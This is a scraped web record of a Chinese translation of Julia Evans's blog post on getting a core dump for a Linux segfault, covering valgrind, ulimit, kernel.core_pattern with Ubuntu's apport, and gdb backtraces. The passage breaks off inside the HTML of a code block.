[{"url_object_id": "5a2415268c5f41548f265013b49fd955", "title": ["在 Linux 上如何得到一个段错误的核心转储"], "url": "http://blog.jobbole.com/114211/", "create_date": "2018/07/14", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/\">Julia Evans</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9834-1.html\">Linux中国/Stephen</a>   </div><p>本周工作中，我花了整整一周的时间来尝试调试一个段错误。我以前从来没有这样做过，我花了很长时间才弄清楚其中涉及的一些基本事情（获得核心转储、找到导致段错误的行号）。于是便有了这篇博客来解释如何做那些事情！</p>\n<p>在看完这篇博客后，你应该知道如何从“哦，我的程序出现段错误，但我不知道正在发生什么”到“我知道它出现段错误时的堆栈、行号了！ ”。</p>\n<h3 id=\"toc_1\">什么是段错误？</h3>\n<p>“段错误segmentation fault”是指你的程序尝试访问不允许访问的内存地址的情况。这可能是由于：</p>\n<ul>\n<li>试图解引用空指针（你不被允许访问内存地址 <code>0</code>）；</li>\n<li>试图解引用其他一些不在你内存（LCTT 译注：指不在合法的内存地址区间内）中的指针；</li>\n<li>一个已被破坏并且指向错误的地方的 C++ 虚表指针C++ vtable pointer，这导致程序尝试执行没有执行权限的内存中的指令；</li>\n<li>其他一些我不明白的事情，比如我认为访问未对齐的内存地址也可能会导致段错误（LCTT 译注：在要求自然边界对齐的体系结构，如 MIPS、ARM 中更容易因非对齐访问产生段错误）。</li>\n</ul>\n<p>这个“C++ 虚表指针”是我的程序发生段错误的情况。我可能会在未来的博客中解释这个，因为我最初并不知道任何关于 C++ 的知识，并且这种虚表查找导致程序段错误的情况也是我所不了解的。</p>\n<p>但是！这篇博客后不是关于 C++ 问题的。让我们谈论的基本的东西，比如，我们如何得到一个核心转储？</p>\n<h3 id=\"toc_2\">步骤1：运行 valgrind</h3>\n<p>我发现找出为什么我的程序出现段错误的最简单的方式是使用 <code>valgrind</code>：我运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623042334f0503818829\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvalgrind -v your-program\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623042334f0503818829-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334f0503818829-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623042334f0503818829-1\"><span class=\"crayon-v\">valgrind</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">program</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334f0503818829-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这给了我一个故障时的堆栈调用序列。 简洁！</p>\n<p>但我想也希望做一个更深入调查，并找出些 <code>valgrind</code> 没告诉我的信息！ 所以我想获得一个核心转储并探索它。</p>\n<h3 id=\"toc_3\">如何获得一个核心转储</h3>\n<p>核心转储core dump是您的程序内存的一个副本，并且当您试图调试您的有问题的程序哪里出错的时候它非常有用。</p>\n<p>当您的程序出现段错误，Linux 的内核有时会把一个核心转储写到磁盘。 当我最初试图获得一个核心转储时，我很长一段时间非常沮丧，因为 – Linux 没有生成核心转储！我的核心转储在哪里？</p>\n<p>这就是我最终做的事情：</p>\n<ol>\n<li>在启动我的程序之前运行 <code>ulimit -c unlimited</code></li>\n<li>运行 <code>sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code></li>\n</ol>\n<h3 id=\"toc_4\">ulimit：设置核心转储的最大尺寸</h3>\n<p><code>ulimit -c</code> 设置核心转储的最大尺寸。 它往往设置为 0，这意味着内核根本不会写核心转储。 它以千字节为单位。 <code>ulimit</code> 是按每个进程分别设置的 —— 你可以通过运行 <code>cat /proc/PID/limit</code> 看到一个进程的各种资源限制。</p>\n<p>例如这些是我的系统上一个随便一个 Firefox 进程的资源限制：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623042334fa351483026\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat /proc/6309/limits \r\nLimit                     Soft Limit           Hard Limit           Units     \r\nMax cpu time              unlimited            unlimited            seconds   \r\nMax file size             unlimited            unlimited            bytes     \r\nMax data size             unlimited            unlimited            bytes     \r\nMax stack size            8388608              unlimited            bytes     \r\nMax core file size        0                    unlimited            bytes     \r\nMax resident set          unlimited            unlimited            bytes     \r\nMax processes             30571                30571                processes \r\nMax open files            1024                 1048576              files     \r\nMax locked memory         65536                65536                bytes     \r\nMax address space         unlimited            unlimited            bytes     \r\nMax file locks            unlimited            unlimited            locks     \r\nMax pending signals       30571                30571                signals   \r\nMax msgqueue size         819200               819200               bytes     \r\nMax nice priority         0                    0                    \r\nMax realtime priority     0                    0                    \r\nMax realtime timeout      unlimited            unlimited            us   \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">6309</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">limits </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-2\"><span class=\"crayon-e\">Limit                     </span><span class=\"crayon-e\">Soft </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Hard </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Units     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-3\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">cpu </span><span class=\"crayon-e\">time              </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">seconds   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-4\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-5\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">data </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-6\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">stack </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">8388608</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-7\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">core </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-8\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">resident </span><span class=\"crayon-e\">set          </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-9\"><span class=\"crayon-e\">Max </span><span class=\"crayon-i\">processes</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">processes </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-10\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">open </span><span class=\"crayon-i\">files</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">1048576</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">files     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-11\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">locked </span><span class=\"crayon-i\">memory</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-12\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">address </span><span class=\"crayon-e\">space         </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-13\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">locks            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">locks     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-14\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">pending </span><span class=\"crayon-i\">signals</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">signals   </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-15\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">msgqueue </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-16\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">nice </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-17\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-18\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-e\">timeout      </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-i\">us</span><span class=\"crayon-h\">   </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-19\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n<p>内核在决定写入多大的核心转储文件时使用软限制soft limit（在这种情况下，<code>max core file size = 0</code>）。 您可以使用 shell 内置命令 <code>ulimit</code>（<code>ulimit -c unlimited</code>） 将软限制增加到硬限制hard limit。</p>\n<h3 id=\"toc_5\">kernel.core_pattern：核心转储保存在哪里</h3>\n<p><code>kernel.core_pattern</code> 是一个内核参数，或者叫 “sysctl 设置”，它控制 Linux 内核将核心转储文件写到磁盘的哪里。</p>\n<p>内核参数是一种设定您的系统全局设置的方法。您可以通过运行 <code>sysctl -a</code> 得到一个包含每个内核参数的列表，或使用 <code>sysctl kernel.core_pattern</code> 来专门查看 <code>kernel.core_pattern</code> 设置。</p>\n<p>所以 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code> 将核心转储保存到目录 <code>/tmp</code> 下，并以 <code>core</code> 加上一系列能够标识（出故障的）进程的参数构成的后缀为文件名。</p>\n<p>如果你想知道这些形如 <code>%e</code>、<code>%p</code> 的参数都表示什么，请参考 <a href=\"http://man7.org/linux/man-pages/man5/core.5.html\">man core</a>。</p>\n<p>有一点很重要，<code>kernel.core_pattern</code> 是一个全局设置 —— 修改它的时候最好小心一点，因为有可能其它系统功能依赖于把它被设置为一个特定的方式（才能正常工作）。</p>\n<h3 id=\"toc_6\">kernel.core_pattern 和 Ubuntu</h3>\n<p>默认情况下在 ubuntu 系统中，<code>kernel.core_pattern</code> 被设置为下面的值：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623042334ff508241998\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sysctl kernel.core_pattern\r\nkernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623042334ff508241998-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334ff508241998-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334ff508241998-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623042334ff508241998-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sysctl </span><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">core_pattern</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334ff508241998-2\"><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">core_pattern</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">P</span></div><div class=\"crayon-line\" id=\"crayon-5b623042334ff508241998-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>这引起了我的迷惑（这 apport 是干什么的，它对我的核心转储做了什么？）。以下关于这个我了解到的：</p>\n<ul>\n<li>Ubuntu 使用一种叫做 apport 的系统来报告 apt 包有关的崩溃信息。</li>\n<li>设定 <code>kernel.core_pattern=|/usr/share/apport/apport %p %s %c %d %P</code> 意味着核心转储将被通过管道送给 <code>apport</code> 程序。</li>\n<li>apport 的日志保存在文件 <code>/var/log/apport.log</code> 中。</li>\n<li>apport 默认会忽略来自不属于 Ubuntu 软件包一部分的二进制文件的崩溃信息</li>\n</ul>\n<p>我最终只是跳过了 apport，并把 <code>kernel.core_pattern</code> 重新设置为 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code>，因为我在一台开发机上，我不在乎 apport 是否工作，我也不想尝试让 apport 把我的核心转储留在磁盘上。</p>\n<h3 id=\"toc_7\">现在你有了核心转储，接下来干什么？</h3>\n<p>好的，现在我们了解了 <code>ulimit</code> 和 <code>kernel.core_pattern</code> ，并且实际上在磁盘的 <code>/tmp</code> 目录中有了一个核心转储文件。太好了！接下来干什么？我们仍然不知道该程序为什么会出现段错误！</p>\n<p>下一步将使用 <code>gdb</code> 打开核心转储文件并获取堆栈调用序列。</p>\n<h3 id=\"toc_8\">从 gdb 中得到堆栈调用序列</h3>\n<p>你可以像这样用 <code>gdb</code> 打开一个核心转储文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b62304233506053084219\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ gdb -c my_core_file\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b62304233506053084219-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b62304233506053084219-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b62304233506053084219-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gdb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">my_core</span><span class=\"crayon-sy\">_</span>file</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b62304233506053084219-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>接下来，我们想知道程序崩溃时的堆栈是什么样的。在 <code>gdb</code> 提示符下运行 <code>bt</code> 会给你一个调用序列backtrace。在我的例子里，<code>gdb</code> 没有为二进制文件加载符号信息，所以这些函数名就像 “??????”。幸运的是，（我们通过）加载符号修复了它。</p>\n<p>下面是如何加载调试符号。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6230423350e748646153\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 